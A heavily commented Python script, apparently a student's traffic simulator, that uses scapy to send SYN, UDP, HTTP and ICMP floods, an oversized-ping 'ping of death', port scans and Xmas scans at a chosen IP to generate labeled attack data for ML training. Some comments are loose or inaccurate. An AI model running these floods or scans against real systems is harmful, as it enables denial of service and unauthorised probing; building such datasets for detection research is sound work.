"""
Mohit — Traffic Simulator
Generates labeled benign + attack traffic for Kunal's ML training.
Usage: sudo python simulate_traffic.py --mode syn_flood --target 192.168.1.10
"""
import argparse
# this python library is used to create and manipulate network packets
# how this works is that it allows us to create packets layer by layer
# IP, TCP, UDP, ICMP are the layers of the network packet

from scapy.all import IP, TCP, UDP, ICMP, send, RandShort
# here scapy is the library, IP, TCP, UDP, ICMP are the layers of the network packet, send is the function that sends the packet, RandShort is the function that generates a random short integer
# random short is used to generate a random source port
# 
# syn flood is a type of DDoS attack that is used to overwhelm a server with SYN packets
# syn packets are used to initiate a TCP connection

def syn_flood(target: str, count: int = 500):
    # here target is the IP address of the server to attack
    # count is the number of packets to send
    # why count? because we are sending packets to the same port
    # print the target
    print(f"[simulate] SYN flood → {target}")
    # send the packet
    # IP(dst=target) is the IP layer of the packet
    # TCP(dport=80, flags="S", sport=RandShort()) is the TCP layer of the packet
    # flags="S" means SYN flag is set
    # sport=RandShort() means source port is random
    send(IP(dst=target)/TCP(dport=80, flags="S", sport=RandShort()), count=count, verbose=False)
    # verbose=False means do not print the packet

def icmp_sweep(target: str, count: int = 100):
    # icmp_sweep is a type of network attack that is used to find active hosts on a network
    # here target is the IP address of the server to attack
    # count is the number of packets to send
    # why count? because we are sending packets to the same port
    # print the target
    print(f"[simulate] ICMP sweep → {target}")
    # send the packet
    # IP(dst=target) is the IP layer of the packet
    # ICMP() is the ICMP layer of the packet
    send(IP(dst=target)/ICMP(), count=count, verbose=False)
    # verbose=False means do not print the packet

def port_scan(target: str):
    # port_scan is a type of network attack that is used to find open ports on a network
    # here target is the IP address of the server to attack
    # why not count? because we are sending packets to different ports
    # print the target
    print(f"[simulate] Port scan → {target}")
    for port in [22, 80, 443, 3306, 8080]:
        # what does upper line means?
        # it means we are sending packets to different ports
        # why does only these ports are chosen?
        # because these are the most common ports used by hackers to attack
        # 22 is for ssh
        # 80 is for http
        # 443 is for https
        # 3306 is for mysql
        # 8080 is for tomcat
        # send the packet
        # IP(dst=target) is the IP layer of the packet
        # TCP(dport=port, flags="S") is the TCP layer of the packet
        # flags="S" means SYN flag is set
        send(IP(dst=target)/TCP(dport=port, flags="S"), verbose=False)
        # verbose=False means do not print the packet


def udp_flood(target:str,count:int=200):
    # udp_flood is a type of network attack that is used to overwhelm a server with UDP packets
    # here target is the IP address of the server to attack
    # count is the number of packets to send
    # why count? because we are sending packets to the same port
    # print the target
    print(f"[simulate] UDP flood → {target}")
    # send the packet
    # IP(dst=target) is the IP layer of the packet
    # UDP(dport=RandShort()) is the UDP layer of the packet
    # RandShort() is the function that generates a random short integer
    send(IP(dst=target)/UDP(dport=RandShort()), count=count, verbose=False)
    # verbose=False means do not print the packet

def http_flood(target: str, count: int = 500):
    # HTTP flood is a type of DDoS attack that overwhelms a web server with seemingly valid HTTP requests (like GET/POST).
    print(f"[simulate] HTTP flood → {target}")
    # We simulate this by sending TCP packets with the Push/ACK flags, representing data payloads on port 80.
    send(IP(dst=target)/TCP(dport=80, flags="PA", sport=RandShort()), count=count, verbose=False)

def ping_of_death(target: str, count: int = 50):
    # Ping of Death sends malformed or oversized ICMP packets.
    # We simulate it by creating a very large payload for the ICMP packet.
    print(f"[simulate] Ping of Death → {target}")
    send(IP(dst=target)/ICMP()/(b"X" * 60000), count=count, verbose=False)

def xmas_scan(target: str, count: int = 100):
    # Xmas scan is a reconnaissance technique that sets the FIN, PSH, and URG flags.
    # It attempts to bypass simple stateless firewalls.
    print(f"[simulate] Xmas scan → {target}")
    send(IP(dst=target)/TCP(dport=RandShort(), flags="FPU"), count=count, verbose=False)


# __name__ is a special variable in python that is used to determine if the script is run as a standalone program or as a module
# if the script is run as a standalone program, then __name__ is set to "__main__"
# this means that the code inside the if __name__ == "__main__": block will only run when the script is run as a standalone program
# standalone means running the script directly from the terminal
# if this is executed then the code inside the if __name__ == "__main__": block will run

if __name__ == "__main__":
    # ap is an object that is used to parse the command line arguments 
    # means it is used to parse the arguments that are passed to the script from the terminal
    # it is come from the argparse library
    # agrparse library is used for parsing the command line arguments and . argumentParser() is a function that is used to create an object that is used to parse the command line arguments
    ap = argparse.ArgumentParser()
    # .add_argument() is a function that is used to add an argument to the parser
    # --mode is the name of the argument
    # choices=["syn_flood","icmp_sweep","port_scan"] means that the argument can only have these values
    # required=True means that the argument is required
    ap.add_argument("--mode",   choices=["syn_flood","icmp_sweep","port_scan","udp_flood","http_flood","ping_of_death","xmas_scan"], required=True)
    # --target is the name of the argument
    # required=True means that the argument is required
    ap.add_argument("--target", required=True)
    # --count is the name of the argument
    # type=int means that the argument is an integer
    # default=200 means that the argument is 200 if not specified
    ap.add_argument("--count",  type=int, default=200)
    # .parse_args() is a function that is used to parse the arguments that are passed to the script from the terminal
    args = ap.parse_args()
    # {"syn_flood": syn_flood, "icmp_sweep": icmp_sweep, "port_scan": port_scan} is a dictionary that is used to store the functions that are called based on the mode
    # args.mode is the mode that is passed to the script from the terminal
    # args.target is the target that is passed to the script from the terminal
    # args.count is the count that is passed to the script from the terminal
    # *([args.count] if args.mode != "port_scan" else []) is a list that is used to store the count
    # if the mode is not "port_scan", then the count is passed to the function
    # if the mode is "port_scan", then the count is not passed to the function
    {"syn_flood": syn_flood, "icmp_sweep": icmp_sweep, "port_scan": port_scan,"udp_flood":udp_flood,"http_flood":http_flood,"ping_of_death":ping_of_death,"xmas_scan":xmas_scan}[args.mode](args.target, *([args.count] if args.mode != "port_scan" else []))
